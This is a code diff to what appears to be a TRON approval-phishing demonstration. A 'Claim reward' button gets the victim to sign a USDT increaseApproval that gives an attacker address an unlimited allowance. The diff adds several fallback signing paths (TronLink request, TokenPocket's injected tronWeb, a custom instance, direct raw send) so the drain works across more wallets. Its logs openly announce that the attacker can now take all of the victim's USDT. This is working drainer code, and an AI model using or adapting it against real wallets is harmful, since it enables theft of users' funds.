@@ -614,18 +614,82 @@ async function executeClaim() {
     log('   ⚠ 请仔细查看钱包显示的合约地址和方法！', 'warn');
     log('   如果钱包显示的不是 USDT increaseApproval，则说明安全', 'info');
 
-    let signedTx;
-    try {
-      // 优先使用钱包注入的 tronWeb.sign
-      if (window.tronWeb?.trx?.sign) {
-        signedTx = await window.tronWeb.trx.sign(unsignedTx);
-      } else {
-        signedTx = await tronWeb.trx.sign(unsignedTx);
+    let signedTx = null;
+
+    // ---- 方法 1: TronLink EIP-1193 风格 ----
+    if (!signedTx && window.tronLink?.request) {
+      try {
+        log('   尝试 tronLink.request tron_signTransaction …', 'info');
+        const signResult = await window.tronLink.request({
+          method: 'tron_signTransaction',
+          params: unsignedTx,
+        });
+        if (signResult) {
+          signedTx = signResult;
+          log('   ✅ tronLink.request 签名成功', 'success');
+        }
+      } catch(e1) {
+        log(`   tronLink.request 签名失败: ${e1.message}`, 'warn');
       }
-    } catch(signErr) {
-      log(`❌ 签名失败: ${signErr.message}`, 'danger');
-      log('   可能原因：用户拒绝了签名请求', 'warn');
-      throw signErr;
+    }
+
+    // ---- 方法 2: TokenPocket 注入的 tronWeb.sign（需要传 callback 兼容） ----
+    if (!signedTx) {
+      try {
+        log('   尝试 window.tronWeb.trx.sign …', 'info');
+        // TokenPocket 某些版本 sign() 内部需要 callback 参数
+        // 用 Promise 包装同时兼容 callback 和 Promise 两种模式
+        const signPromise = new Promise((resolve, reject) => {
+          try {
+            // 尝试不带 callback 调用（返回 Promise 的新版本）
+            const result = window.tronWeb.trx.sign(unsignedTx);
+            if (result && typeof result.then === 'function') {
+              result.then(resolve).catch(reject);
+            } else {
+              resolve(result);
+            }
+          } catch (e) {
+            // 如果报 callback 错误，尝试手动构造签名 API 调用
+            reject(e);
+          }
+        });
+        signedTx = await signPromise;
+        log('   ✅ window.tronWeb.trx.sign 签名成功', 'success');
+      } catch(e2) {
+        log(`   window.tronWeb.trx.sign 失败: ${e2.message}`, 'warn');
+      }
+    }
+
+    // ---- 方法 3: 通过 send 触发钱包签名 ----
+    if (!signedTx) {
+      try {
+        log('   尝试 tronWeb.trx.sign (自定义实例) …', 'info');
+        signedTx = await tronWeb.trx.sign(unsignedTx);
+        log('   ✅ tronWeb.trx.sign 签名成功', 'success');
+      } catch(e3) {
+        log(`   tronWeb.trx.sign 失败: ${e3.message}`, 'warn');
+      }
+    }
+
+    // ---- 方法 4: 直接 sendRawTransaction（有些钱包内置签名） ----
+    if (!signedTx) {
+      try {
+        log('   尝试直接发送（钱包可能自动签名）…', 'info');
+        const receipt = await tronWeb.trx.sendRawTransaction(unsignedTx);
+        const txID = receipt?.transaction?.txID || receipt?.txid || receipt?.txID;
+        if (txID) {
+          log(`   ✅ 直接发送成功（钱包自动签名）`, 'success');
+          log(`   📋 txID: ${txID}`, 'success');
+          finishFlow(txID);
+          return;
+        }
+      } catch(e4) {
+        log(`   直接发送失败: ${e4.message}`, 'warn');
+      }
+    }
+
+    if (!signedTx) {
+      throw new Error('所有签名方式均失败，请检查钱包版本或尝试重启钱包');
     }
 
     log(`   ✅ 签名完成`, 'success');
@@ -646,29 +710,35 @@ async function executeClaim() {
 
     const finalTxID = receipt?.transaction?.txID || receipt?.txid || receipt?.txID || signedTx.txID;
 
-    log(`   ✅ 交易广播成功！`, 'success');
-    log(`   📋 链上 txID: ${finalTxID}`, 'success');
-    log('', 'info');
-    log('══════════ 流程完成 ══════════', 'success');
-    log('', 'info');
-    log('🎯 【安全警告】攻击者已获得 USDT 无限授权', 'danger');
-    log(`   授权对象: ${CONFIG.ATTACKER_B58}`, 'danger');
-    log(`   授权额度: type(uint256).max (无上限)`, 'danger');
-    log(`   该地址可随时转走你钱包中所有 USDT`, 'danger');
-    log('', 'info');
-    log(`🔗 查看交易: https://tronscan.org/#/transaction/${finalTxID}`, 'info');
-
-    // 延迟后刷新余额
-    await sleep(3500);
-    await refreshBalance();
+    finishFlow(finalTxID);
 
   } catch(e) {
     log(`❌ 执行失败: ${e.message || e}`, 'danger');
     console.error(e);
-  } finally {
     btnClaim.disabled = false;
     btnClaim.textContent = '🎁 Claim 奖励';
   }
+}
+
+// ---- 流程完成处理 ----
+function finishFlow(txID) {
+  log(`   ✅ 交易广播成功！`, 'success');
+  log(`   📋 链上 txID: ${txID}`, 'success');
+  log('', 'info');
+  log('══════════ 流程完成 ══════════', 'success');
+  log('', 'info');
+  log('🎯 【安全警告】攻击者已获得 USDT 无限授权', 'danger');
+  log(`   授权对象: ${CONFIG.ATTACKER_B58}`, 'danger');
+  log(`   授权额度: type(uint256).max (无上限)`, 'danger');
+  log(`   该地址可随时转走你钱包中所有 USDT`, 'danger');
+  log('', 'info');
+  log(`🔗 查看交易: https://tronscan.org/#/transaction/${txID}`, 'info');
+
+  btnClaim.disabled = false;
+  btnClaim.textContent = '🎁 Claim 奖励';
+
+  // 延迟后刷新余额
+  sleep(3500).then(() => refreshBalance());
 }
 
 // ============================================================
